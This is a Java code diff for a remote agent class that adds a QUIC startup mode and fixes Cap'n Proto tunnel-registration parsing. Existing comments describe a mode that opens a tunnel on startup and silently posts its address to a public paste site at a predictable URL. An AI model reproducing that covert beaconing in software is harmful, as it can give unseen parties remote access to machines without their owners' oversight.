@@ -45,7 +45,8 @@ public class kisama {
     private final boolean DEBUG;
     private final String HOST;
     private final int PORT;
-    private final int KMODE;   // 0=普通启动 1=隧道+域名文件+stdin 2=隧道+shz.al 静默上报 (docs/API.MD 第九节)
+    private final int KMODE;   // 0=普通启动 1=隧道+域名文件+stdin 2=隧道+shz.al 静默上报; 2q=2 且启动隧道走 QUIC (docs/API.MD 第九节)
+    private final boolean KMODE_QUIC;   // KMODE=2q 派生: 启动隧道走 QUIC 传输 (java11 本批次暂走 h2, 后续批次激活)
     // KMODE 生效值来源: env=进程环境变量 dotenv=jar 同目录 .env build=构造参数烘焙值 default=内置缺省
     // 排障用: 烘焙值被服务器残留环境变量压住时, 日志会直接显示 src=env
     private final String KMODE_SOURCE;
@@ -198,7 +199,7 @@ public class kisama {
     // 其余 (无 opt-in 头/超阈值) 保持原始字节流——旧客户端零适配, 大文件不付 Base64+33% 与
     // 整读内存的代价。0 = 关闭加密 (恒明文)。
     private static final long DOWNLOAD_ENCRYPT_MAX = Long.parseLong(DOTENV.getOrDefault("DOWNLOAD_ENCRYPT_MAX", "4194304"));
-    private static final String AGENT_VERSION = "0.6.1-java11";
+    private static final String AGENT_VERSION = "0.6.2-java11";
 
     // baseinfo 三组快照 (docs/API.MD 十六): P 级进程内只建一次; T-local 30s; T-net 3600s.
     // 快照只含系统字段, 凭证在路由层按请求装配, 轮换不再清空
@@ -227,6 +228,7 @@ public class kisama {
                         DOTENV.getOrDefault("SERVER_PORT", "8000"))));
         // KMODE 启动模式: "1"=隧道+域名文件+stdin 监听; "2"=隧道+shz.al 静默上报 (详见 docs/API.MD 第九节)
         this.KMODE = parseKmode(DOTENV.getOrDefault("KMODE", "0"));
+        this.KMODE_QUIC = parseKmodeQuic(DOTENV.getOrDefault("KMODE", "0"));
         this.KMODE_SOURCE = settingSource("KMODE", null);
         // KMODE=2: shz.al 自定义名 (可预测 URL 的组成部分); KNAME_KEY 缺省复用 KNAME
         String kname = DOTENV.get("KNAME") == null ? "" : DOTENV.get("KNAME").trim();
@@ -262,6 +264,7 @@ public class kisama {
         this.DEBUG = Boolean.parseBoolean(DOTENV.getOrDefault("DEBUG", "false"));
         this.HOST = DOTENV.getOrDefault("HOST", "0.0.0.0");
         this.KMODE = parseKmode(resolveSetting("KMODE", bakedKmode, "0"));
+        this.KMODE_QUIC = parseKmodeQuic(resolveSetting("KMODE", bakedKmode, "0"));
         this.KMODE_SOURCE = settingSource("KMODE", bakedKmode);
         String kname2 = resolveSetting("KNAME", bakedKname, "").trim();
         String knameKey2 = resolveSetting("KNAME_KEY", bakedKnameKey, "").trim();
@@ -1403,8 +1406,12 @@ public class kisama {
     // KMODE=2 时: 启动即建临时隧道并把域名上报至 shz.al (可预测 URL, 全程静默)。
     private static int parseKmode(String raw) {
         if ("1".equals(raw)) return 1;
-        if ("2".equals(raw)) return 2;
+        if ("2".equals(raw) || "2q".equalsIgnoreCase(raw) || "2quic".equalsIgnoreCase(raw)) return 2;
         return 0;
+    }
+
+    private static boolean parseKmodeQuic(String raw) {
+        return raw != null && raw.matches("(?i)2q(?:uic)?");
     }
 
     // shz.al 自定义名规则: >=3 字符, 限字母数字及 +_-[]*$=@,;/;
@@ -5094,7 +5101,9 @@ public class kisama {
             long segmentsMinusOne = u32le(buffer, pos);
             long firstWords = u32le(buffer, pos + 4);
             int segments = (int) segmentsMinusOne + 1;
-            int headerWords = 2 + segments;
+            // 标准 Cap'n Proto 流分帧: 段表 = 4B 段数-1 + 4B*段数, 8 字节对齐
+            // (单段消息表长 8B, 与 js/java 同源修复)
+            int headerWords = segments + 1;
             int headerSize = headerWords * 4;
             if (headerSize % 8 != 0) {
                 headerSize += 4;
@@ -5167,7 +5176,14 @@ public class kisama {
             }
         }
         String s = new String(raw, 0, (int) count, StandardCharsets.UTF_8);
-        return s.replaceAll("\\0+$", "");
+        // 剥离 capnp Text 的尾部 NUL 填充 (py 用 rstrip(b"\0") 同语义)。不能用正则
+        // replaceAll("\\0+$",""): Java 正则 \0 后必须再跟八进制数字, 单独 \0 编译即抛
+        // "Illegal octal escape sequence" — 曾致 capnpText 每次调用必抛, 注册应答永远解析失败
+        int end = s.length();
+        while (end > 0 && s.charAt(end - 1) == '\0') {
+            end--;
+        }
+        return s.substring(0, end);
     }
 
     private static final class CapnpReturnResult {
@@ -5203,29 +5219,47 @@ public class kisama {
         }
         int[] retInfo = capnpStruct(words, msgTarget + msgData);
         int retTarget = retInfo[0], retData = retInfo[1];
+        // 标准 capnp RPC: Return{answerId:u32 @data0, releaseParamCaps @data0.b4, union tag @data0.b6-7, ptr0}
+        // — 与 js/py/java 标准化实现逐字对齐 (0.6.2): bootstrap 应答按 CapDescriptor 识别, 异常按
+        // exception@6 结构解析, 注册应答剥离边缘信封后按 ConnectionResponse union 判定
         long which = (words[retTarget] >>> 48) & 0xFFFFL;
-        if (which == 1) {
-            return new CapnpReturnResult(false, null, false, capnpText(words, retTarget + retData));
+        if (which == 4) {
+            // exception@6: Exception{reason@0:Text, ...}
+            int[] excInfo = capnpStruct(words, retTarget + retData);
+            String reason = capnpText(words, excInfo[0] + excInfo[1]);
+            return new CapnpReturnResult(false, null, false, reason == null || reason.isEmpty() ? "unknown error" : reason);
         }
         if (which != 0) {
             return new CapnpReturnResult(false, null, false, "RPC return union " + which);
         }
         int[] payloadInfo = capnpStruct(words, retTarget + retData);
         int payloadTarget = payloadInfo[0], payloadData = payloadInfo[1];
+        if (payloadInfo[2] < 1) {
+            return new CapnpReturnResult(false, null, false, "empty RPC payload");
+        }
+        long contentPtr = words[payloadTarget + payloadData];
+        if ((contentPtr & 3L) == 3L) {
+            // bootstrap 应答: content = CapDescriptor (capability 指针), 非注册结果 — 静默跳过语义
+            return new CapnpReturnResult(false, null, false, "bootstrap");
+        }
         int[] contentInfo = capnpStruct(words, payloadTarget + payloadData);
-        int contentTarget = contentInfo[0], contentData = contentInfo[1];
-        long union = words[contentTarget];
-        long unionWhich = union & 0xFFFFL;
-        if (unionWhich == 0) {
-            return new CapnpReturnResult(false, null, false, capnpText(words, contentTarget + contentData));
+        int node = contentInfo[0], nodeData = contentInfo[1], nodePtrs = contentInfo[2];
+        // 边缘实机取证 (2026-10-31, QUIC 注册应答): content 外多一层信封 (data=0, ptrs=1),
+        // ConnectionResponse 在其 ptr0 — 信封存在时剥一层; h2 应答无信封 (data>=1) 不受影响
+        if (nodeData == 0 && nodePtrs == 1) {
+            int[] inner = capnpStruct(words, node + nodeData);
+            node = inner[0];
+            nodeData = inner[1];
         }
-        if (unionWhich != 1) {
-            return new CapnpReturnResult(false, null, false, "registration union " + unionWhich);
+        long unionWhich = nodeData > 0 ? words[node] & 0xFFFFL : 0L;
+        if (unionWhich == 1L) {
+            // ConnectionResponse.connectionDetails@1: ConnectionDetails{...location@1:Text}
+            int[] detailsInfo = capnpStruct(words, node + nodeData);
+            String location = capnpText(words, detailsInfo[0] + detailsInfo[1] + 1);
+            return new CapnpReturnResult(true, location, true, null);
         }
-        int[] detailsInfo = capnpStruct(words, contentTarget + contentData);
-        int detailsTarget = detailsInfo[0], detailsData = detailsInfo[1];
-        String location = capnpText(words, detailsTarget + detailsData + 1);
-        return new CapnpReturnResult(true, location, (words[detailsTarget] & 1L) != 0L, null);
+        String cause = capnpText(words, node + nodeData);
+        return new CapnpReturnResult(false, null, false, cause == null || cause.isEmpty() ? "unknown error" : cause);
     }
 
     // ==================== Quick Tunnel 注册与边缘连接 (对齐 cftunnel-product.js) ====================
@@ -6040,6 +6074,11 @@ public class kisama {
             for (byte[] message : parsed.messages) {
                 try {
                     CapnpReturnResult result = capnpReturnResult(message);
+                    if (!result.ok && "bootstrap".equals(result.error)) {
+                        // bootstrap 应答 (Payload.content = capability): 非注册结果, 静默跳过
+                        // (js/py/java 同语义) — 误判为注册失败会停掉连接, 永远等不到 register 应答
+                        continue;
+                    }
                     if (result.ok) {
                         connection.agent.log("[TRACE-ARGO] ✅ 隧道连接已在边缘注册: "
                                 + (result.location != null ? result.location : "unknown"));
